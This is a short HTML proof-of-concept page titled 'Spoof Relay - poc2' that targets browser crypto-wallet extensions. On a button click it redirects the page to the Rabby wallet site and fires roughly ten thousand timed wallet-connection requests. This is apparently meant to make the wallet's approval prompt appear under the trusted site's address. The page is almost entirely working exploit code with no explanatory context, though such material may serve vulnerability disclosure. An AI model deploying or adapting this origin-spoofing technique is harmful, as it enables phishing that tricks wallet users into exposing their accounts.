<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Spoof Relay - poc2: 200</title>
    </head>
    <body>
        <h2>Connecting Walletâ€¦</h2>
        <p id="msg">Please click the button to connect.</p>
        <button id="connectBtn">Connect Wallet</button>
        <script>
            document
                .getElementById("connectBtn")
                .addEventListener("click", async () => {
                    if (!window.ethereum) {
                        document.getElementById("msg").innerText =
                            "No wallet installed!";
                        return;
                    }
                    try {
                        window.location = "https://rabby.io";
                        for (let i = 1; i < 10000; i++) {
                            setTimeout(async () => {
                                const accountsPromise = window.ethereum.request(
                                    {
                                        method: "eth_requestAccounts",
                                    }
                                );
                                try {
                                    const accounts = await accountsPromise;
                                    document.getElementById("msg").innerText =
                                        "Connected: " + accounts[0];
                                } catch (err) {
                                    document.getElementById("msg").innerText =
                                        "Connection failed";
                                    console.error(err);
                                }
                            }, i);
                        }
                    } catch (err) {
                        document.getElementById("msg").innerText =
                            "Unexpected error";
                        console.error(err);
                    }
                });
        </script>
    </body>
</html>
